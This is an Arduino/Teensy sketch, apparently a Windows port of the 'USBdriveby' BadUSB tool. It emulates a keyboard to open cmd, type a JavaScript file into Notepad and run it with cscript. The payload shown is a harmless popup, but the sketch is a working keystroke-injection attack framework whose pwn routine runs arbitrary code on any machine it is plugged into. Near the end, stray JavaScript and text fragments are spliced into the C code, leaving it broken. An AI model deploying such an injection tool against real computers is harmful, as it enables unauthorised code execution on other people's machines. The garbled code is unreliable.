
// USBdriveby Windows version by FFY00 (Filipe Laíns)
// Based on Samy Kamkar work
// https://github.com/samyk/usbdriveby
// Write and execute JS on Windows machine
// https://stackoverflow.com/questions/41777585/running-javascript-from-the-windows-command-prompt

// Simulates a HID keyboard and creates executable JS file, then executes JS code
// Tested on Windows 7

// Popup message
#define POPUP_MESSAGE "Hello from JS!"
const unsigned int ledPin = 13;
const unsigned int delayTime = 1500;

void setup()
{
  delay(1000);

  // Setup LED
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  waitForDrivers();

  // Download content from web
  pwn();
}

// Open an application on Windows via Run
void openapp(String app)
{
  // Windows Key + R to open Run
  key(KEY_R , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

  // Type the App you want to open
  Keyboard.print(app);
  key(KEY_ENTER, 0);
  Keyboard.send_now();
  delay(delayTime);
}

void key(int KEY, int MODIFIER)
 {
  Keyboard.set_modifier(MODIFIER);
  Keyboard.set_key1(KEY);
  Keyboard.send_now();
  delay(20);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(20);
 }

void waitForDrivers()
{
    while (!(keyboard_leds & 2))
    {
        key(KEY_CAPS_LOCK, 0);
    }
    if (keyboard_leds & 2)
    {
        key(KEY_CAPS_LOCK, 0);
    }
}


void pwn()
{
  openapp("cmd");
  Keyboard.println("cd Desktop");
  Keyboard.println("echo.>script_file.js");
  Keyboard.println("notepad script_file.js");
  
  delay(delayTime);
  Keyboard.println("(function ShowAlert() {");
  Keyboard.println("    var popupMessage = WScript.arguments(0);");
  Keyboard.println("    WScript.echo(popupMessage);");
  Keyboard.println("    var timeout = 0;");
  Keyboard.println("    var buttons = 0;");
  Keyboard.println("    var icon = 48;");
  Keyboard.println("    var shell = new ActiveXObject(\"WScript.Shell\");");
  Keyboard.println("    shell.Popup(popupMessage, timeout, \"Exclamation\", buttons + icon);");
  Keyboard.println("})()");
  key(KEY_F4, MODIFIERKEY_ALT);
  delay(delayTime/5);
  key(KEY_ENTER, 0);
  delay(delayTime);

  Keyboard.print("cscript script_file.js ");
  Keyboard.println(POPUP_MESSAGE);cmd
  on = 48;
      var shell = new ActiveXObject("WScript.Shell");
          shell.Popup(popupMessage, timeout, "Exclamation", buttons + icon);
})()

  delay(delayTime);
  key(KEY_ENTER, 0);
}

void loop()
{
  // Blink -> IT'S DONE
  digitalWrite(ledPin, HIGH);
  delay(80);
  digitalWrite(ledPin, LOW);
  delay(80);
}
